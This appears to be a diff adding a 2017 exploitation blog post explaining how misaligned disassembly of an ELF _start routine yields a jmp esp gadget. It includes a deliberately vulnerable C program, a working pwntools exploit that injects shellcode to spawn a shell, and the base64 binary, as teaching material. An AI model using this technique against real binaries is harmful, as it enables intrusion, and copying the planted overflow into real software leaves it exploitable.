@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="zh">
+	<head>
+		<link href="http://gmpg.org/xfn/11" rel="profile">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+		<!-- Enable responsiveness on mobile devices-->
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+		<title>Tech Rain</title>
+
+		<script>location.protocol === 'http:' && !location.hostname.match(/^(localhost|127\.0\.0\.1|\[::1\])$/) && (location.protocol = 'https:')</script>
+
+		<!-- CSS -->
+		<link href="//fonts.googleapis.com/" rel="dns-prefetch">
+		<link href="//fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic|Abril+Fatface|PT+Sans:400,400italic,700&amp;subset=latin,latin-ext" rel="stylesheet">
+
+		<link rel="stylesheet" href="https://blog.inndy.tw/theme/css/poole.css" />
+		<link rel="stylesheet" href="https://blog.inndy.tw/theme/css/hyde.css" />
+		<link rel="stylesheet" href="https://blog.inndy.tw/theme/css/syntax.css" />
+		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+
+		<!-- RSS -->
+		<link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+	</head>
+
+	<body class="theme-base-0d">
+<div class="sidebar">
+	<div class="container sidebar-sticky">
+		<div class="sidebar-about">
+
+			<h1>
+				<a href="/">
+					<img class="profile-picture" src="https://gravatar.com/avatar/26cdb92aafb2b2e6c8972edebda4bd17?s=180">
+					Tech Rain
+				</a>
+			</h1>
+				<h4>技術需要雨水滋潤才能成長茁壯</h4>
+			<p class="lead"></p>
+			<p class="lead">It's Inndy speaking. </p>
+			<p></p>
+		</div>
+		<nav class="sidebar-nav">
+					<a class="sidebar-nav-item" href="https://github.com/Inndy">
+						<i class="fa fa-github"></i>
+					</a>
+					<a class="sidebar-nav-item" href="https://twitter.com/Inndy_tw">
+						<i class="fa fa-twitter"></i>
+					</a>
+					<a class="sidebar-nav-item" href="https://www.inndy.tw/">
+						<i class="fa fa-home"></i>
+					</a>
+			<a class="sidebar-nav-item" href="">
+				<i class="fa fa-feed"></i>
+			</a>
+		</nav>
+	</div>
+</div>		<div class="content container">
+<div class="post">
+	<h1 class="post-title">x86 ELF Stack Overflow Jmp Esp (Rip) Trick</h1>
+	<span class="post-date">2017/01/24 12:27</span>
+	<p>In short: You can find <code>jmp esp</code> (<code>jmp rip</code>) gadget in almost every dynamic linked ELF binary.</p>
+<p>Here's a common <code>\_start</code> from a x86 ELF binary:</p>
+<div class="highlight"><pre><span></span><span class="err">080488</span><span class="nf">d3</span> <span class="err">&lt;</span><span class="no">_start</span><span class="err">&gt;</span><span class="p">:</span>
+ <span class="err">80488</span><span class="nl">d3:</span>       <span class="err">31</span> <span class="nf">ed</span>                   <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span><span class="no">ebp</span>
+ <span class="err">80488</span><span class="nl">d5:</span>       <span class="err">5</span><span class="nf">e</span>                      <span class="no">pop</span>    <span class="no">esi</span>
+ <span class="err">80488</span><span class="nl">d6:</span>       <span class="err">89</span> <span class="nf">e1</span>                   <span class="no">mov</span>    <span class="no">ecx</span><span class="p">,</span><span class="no">esp</span>
+ <span class="err">80488</span><span class="nl">d8:</span>       <span class="err">83</span> <span class="nf">e4</span> <span class="no">f0</span>                <span class="no">and</span>    <span class="no">esp</span><span class="p">,</span><span class="mi">0xfffffff0</span>
+ <span class="err">80488</span><span class="nl">db:</span>       <span class="err">50</span>                      <span class="nf">push</span>   <span class="no">eax</span>
+ <span class="err">80488</span><span class="nl">dc:</span>       <span class="err">54</span>                      <span class="nf">push</span>   <span class="no">esp</span>
+ <span class="err">80488</span><span class="nl">dd:</span>       <span class="err">52</span>                      <span class="nf">push</span>   <span class="no">edx</span>
+ <span class="err">80488</span><span class="nl">de:</span>       <span class="err">68</span> <span class="err">80</span> <span class="err">8</span><span class="nf">f</span> <span class="mi">04</span> <span class="mi">08</span>          <span class="no">push</span>   <span class="mi">0x8048f80</span>
+ <span class="err">80488</span><span class="nl">e3:</span>       <span class="err">68</span> <span class="err">10</span> <span class="err">8</span><span class="nf">f</span> <span class="mi">04</span> <span class="mi">08</span>          <span class="no">push</span>   <span class="mi">0x8048f10</span>
+ <span class="err">80488</span><span class="nl">e8:</span>       <span class="err">51</span>                      <span class="nf">push</span>   <span class="no">ecx</span>
+ <span class="err">80488</span><span class="nl">e9:</span>       <span class="err">56</span>                      <span class="nf">push</span>   <span class="no">esi</span>
+ <span class="err">80488</span><span class="nl">ea:</span>       <span class="err">68</span> <span class="nf">b0</span> <span class="mi">88</span> <span class="mi">04</span> <span class="mi">08</span>          <span class="no">push</span>   <span class="mi">0x80488b0</span>
+ <span class="err">80488</span><span class="nl">ef:</span>       <span class="nf">e8</span> <span class="no">cc</span> <span class="no">fe</span> <span class="no">ff</span> <span class="no">ff</span>          <span class="no">call</span>   <span class="mh">80487c0</span> <span class="p">&lt;</span><span class="no">__libc_start_main@plt</span><span class="p">&gt;</span>
+ <span class="err">80488</span><span class="nl">f4:</span>       <span class="nf">f4</span>                      <span class="no">hlt</span>
+ <span class="err">80488</span><span class="nl">f5:</span>       <span class="err">66</span> <span class="err">90</span>                   <span class="nf">xchg</span>   <span class="no">ax</span><span class="p">,</span><span class="no">ax</span>
+ <span class="err">80488</span><span class="nl">f7:</span>       <span class="err">66</span> <span class="err">90</span>                   <span class="nf">xchg</span>   <span class="no">ax</span><span class="p">,</span><span class="no">ax</span>
+ <span class="err">80488</span><span class="nl">f9:</span>       <span class="err">66</span> <span class="err">90</span>                   <span class="nf">xchg</span>   <span class="no">ax</span><span class="p">,</span><span class="no">ax</span>
+ <span class="err">80488</span><span class="nl">fb:</span>       <span class="err">66</span> <span class="err">90</span>                   <span class="nf">xchg</span>   <span class="no">ax</span><span class="p">,</span><span class="no">ax</span>
+ <span class="err">80488</span><span class="nl">fd:</span>       <span class="err">66</span> <span class="err">90</span>                   <span class="nf">xchg</span>   <span class="no">ax</span><span class="p">,</span><span class="no">ax</span>
+ <span class="err">80488</span><span class="nl">ff:</span>       <span class="err">90</span>                      <span class="nf">nop</span>
+
+<span class="err">08048900</span> <span class="err">&lt;</span><span class="nf">__x86.get_pc_thunk.bx</span><span class="err">&gt;</span><span class="p">:</span>
+ <span class="err">8048900:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">1</span><span class="no">c</span> <span class="mi">24</span>                <span class="no">mov</span>    <span class="no">ebx</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">esp</span><span class="p">]</span>
+ <span class="err">8048903:</span>       <span class="nf">c3</span>                      <span class="no">ret</span>
+</pre></div>
+
+
+<p>Use instruction truncation trick, diassembly at <code>0x080488f3</code>:</p>
+<div class="highlight"><pre><span></span> <span class="err">80488</span><span class="nl">f3:</span>       <span class="nf">ff</span> <span class="no">f4</span>                   <span class="no">push</span>   <span class="no">esp</span>
+ <span class="err">80488</span><span class="nl">f5:</span>       <span class="err">66</span> <span class="err">90</span>                   <span class="nf">xchg</span>   <span class="no">ax</span><span class="p">,</span><span class="no">ax</span>
+ <span class="err">80488</span><span class="nl">f7:</span>       <span class="err">66</span> <span class="err">90</span>                   <span class="nf">xchg</span>   <span class="no">ax</span><span class="p">,</span><span class="no">ax</span>
+ <span class="err">80488</span><span class="nl">f9:</span>       <span class="err">66</span> <span class="err">90</span>                   <span class="nf">xchg</span>   <span class="no">ax</span><span class="p">,</span><span class="no">ax</span>
+ <span class="err">80488</span><span class="nl">fb:</span>       <span class="err">66</span> <span class="err">90</span>                   <span class="nf">xchg</span>   <span class="no">ax</span><span class="p">,</span><span class="no">ax</span>
+ <span class="err">80488</span><span class="nl">fd:</span>       <span class="err">66</span> <span class="err">90</span>                   <span class="nf">xchg</span>   <span class="no">ax</span><span class="p">,</span><span class="no">ax</span>
+ <span class="err">80488</span><span class="nl">ff:</span>       <span class="err">90</span>                      <span class="nf">nop</span>
+ <span class="err">8048900:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">1</span><span class="no">c</span> <span class="mi">24</span>                <span class="no">mov</span>    <span class="no">ebx</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">esp</span><span class="p">]</span>
+ <span class="err">8048903:</span>       <span class="nf">c3</span>                      <span class="no">ret</span>
+</pre></div>
+
+
+<p>Which equals to:</p>
+<div class="highlight"><pre><span></span> <span class="err">80488</span><span class="nl">f3:</span>       <span class="nf">ff</span> <span class="no">f4</span>                   <span class="no">push</span>   <span class="no">esp</span>
+ <span class="err">8048900:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">1</span><span class="no">c</span> <span class="mi">24</span>                <span class="no">mov</span>    <span class="no">ebx</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">esp</span><span class="p">]</span>
+ <span class="err">8048903:</span>       <span class="nf">c3</span>                      <span class="no">ret</span>
+</pre></div>
+
+
+<p>We know that: <code>jmp $ADDR</code> equals to <code>push $ADDR; ret</code>.</p>
+<p>So, once you got a binary without NX (DEP), this gadget would be super useful!</p>
+<h2>Sample</h2>
+<p>easybof.c:</p>
+<div class="highlight"><pre><span></span><span class="c1">// gcc-4.8 easybof.c -o easybof -m32 -zexecstack -fno-stack-protector -D_FORTIFY_SOURCE=0 -O3</span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Overflow me plz:&quot;</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>exploit.py:</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python2</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># pip2 install pwntools</span>
+
+<span class="n">ELF</span><span class="o">.</span><span class="n">find</span> <span class="o">=</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">sig</span><span class="p">:</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">sig</span><span class="p">))</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;easybof&#39;</span><span class="p">)</span>
+
+<span class="n">ret</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xc3</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">jmp_esp</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xff\xff\xf4</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+
+<span class="k">print</span> <span class="s1">&#39;RET     gadget at 0x</span><span class="si">%.8x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">ret</span>
+<span class="k">print</span> <span class="s1">&#39;JMP_ESP gadget at 0x</span><span class="si">%.8x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">jmp_esp</span>
+
+<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./easybof&#39;</span><span class="p">)</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">jmp_esp</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+
+<p>easybof.elf (base64 encoded):</p>
+<div class="highlight"><pre><span></span>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
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQhAQIMIQECAAAAAABAAAAAQAAAAwA
+AADIggQIDQAAAOSEBAgZAAAACJ8ECBsAAAAEAAAAGgAAAAyfBAgcAAAABAAAAPX+/2+sgQQIBQAAACyCBAgGAAAAzIEECAoAAABQAAAACwAAABAAAAAVAAAA
+AAAAAAMAAAAAoAQIAgAAABgAAAAUAAAAEQAAABcAAACwggQIEQAAAKiCBAgSAAAACAAAABMAAAAIAAAA/v//b4iCBAj///9vAQAAAPD//298ggQIAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABSfBAgAAAAAAAAAAAaDBAgWgwQIJoMECAAAAAAAAAAAR0NDOiAoVWJ1bnR1
+IDQuOC41LTR1YnVudHUyKSA0LjguNQAALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuQUJJLXRhZwAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5z
+eW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbC5keW4ALnJlbC5wbHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0
+YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuamNyAC5keW5hbWljAC5nb3QucGx0AC5kYXRhAC5ic3MALmNvbW1l
+bnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAAAABAAAAAgAAAFSBBAhUAQAAEwAAAAAAAAAAAAAAAQAAAAAAAAATAAAA
+BwAAAAIAAABogQQIaAEAACAAAAAAAAAAAAAAAAQAAAAAAAAAIQAAAAcAAAACAAAAiIEECIgBAAAkAAAAAAAAAAAAAAAEAAAAAAAAADQAAAD2//9vAgAAAKyB
+BAisAQAAIAAAAAUAAAAAAAAABAAAAAQAAAA+AAAACwAAAAIAAADMgQQIzAEAAGAAAAAGAAAAAQAAAAQAAAAQAAAARgAAAAMAAAACAAAALIIECCwCAABQAAAA
+AAAAAAAAAAABAAAAAAAAAE4AAAD///9vAgAAAHyCBAh8AgAADAAAAAUAAAAAAAAAAgAAAAIAAABbAAAA/v//bwIAAACIggQIiAIAACAAAAAGAAAAAQAAAAQA
+AAAAAAAAagAAAAkAAAACAAAAqIIECKgCAAAIAAAABQAAAAAAAAAEAAAACAAAAHMAAAAJAAAAQgAAALCCBAiwAgAAGAAAAAUAAAAYAAAABAAAAAgAAAB8AAAA
+AQAAAAYAAADIggQIyAIAACMAAAAAAAAAAAAAAAQAAAAAAAAAdwAAAAEAAAAGAAAA8IIECPACAABAAAAAAAAAAAAAAAAQAAAABAAAAIIAAAABAAAABgAAADCD
+BAgwAwAACAAAAAAAAAAAAAAACAAAAAAAAACLAAAAAQAAAAYAAABAgwQIQAMAAKIBAAAAAAAAAAAAABAAAAAAAAAAkQAAAAEAAAAGAAAA5IQECOQEAAAUAAAA
+AAAAAAAAAAAEAAAAAAAAAJcAAAABAAAAAgAAAPiEBAj4BAAAGQAAAAAAAAAAAAAABAAAAAAAAACfAAAAAQAAAAIAAAAUhQQIFAUAACwAAAAAAAAAAAAAAAQA
+AAAAAAAArQAAAAEAAAACAAAAQIUECEAFAADAAAAAAAAAAAAAAAAEAAAAAAAAALcAAAAOAAAAAwAAAAifBAgIDwAABAAAAAAAAAAAAAAABAAAAAAAAADDAAAA
+DwAAAAMAAAAMnwQIDA8AAAQAAAAAAAAAAAAAAAQAAAAAAAAAzwAAAAEAAAADAAAAEJ8ECBAPAAAEAAAAAAAAAAAAAAAEAAAAAAAAANQAAAAGAAAAAwAAABSf
+BAgUDwAA6AAAAAYAAAAAAAAABAAAAAgAAACGAAAAAQAAAAMAAAD8nwQI/A8AAAQAAAAAAAAAAAAAAAQAAAAEAAAA3QAAAAEAAAADAAAAAKAECAAQAAAYAAAA
+AAAAAAAAAAAEAAAABAAAAOYAAAABAAAAAwAAABigBAgYEAAACAAAAAAAAAAAAAAABAAAAAAAAADsAAAACAAAAAMAAAAgoAQIIBAAAAQAAAAAAAAAAAAAAAEA
+AAAAAAAA8QAAAAEAAAAwAAAAAAAAACAQAAAjAAAAAAAAAAAAAAABAAAAAQAAAAEAAAADAAAAAAAAAAAAAABDEAAA+gAAAAAAAAAAAAAAAQAAAAAAAAA=
+</pre></div>
+	<div id="disqus_thread"></div>
+		<script type="text/javascript">
+			var disqus_shortname = 'techrain';
+			(function() {
+	 			var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	 			dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	 			(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	 		})();
+		</script>
+	<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+</div>
+		</div>
+	<script type="text/javascript">
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+ 			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+ 			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+ 			})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+			ga('create', 'UA-50860830-2', 'auto');
+			ga('send', 'pageview');
+	</script>
+	</body>
+</html>
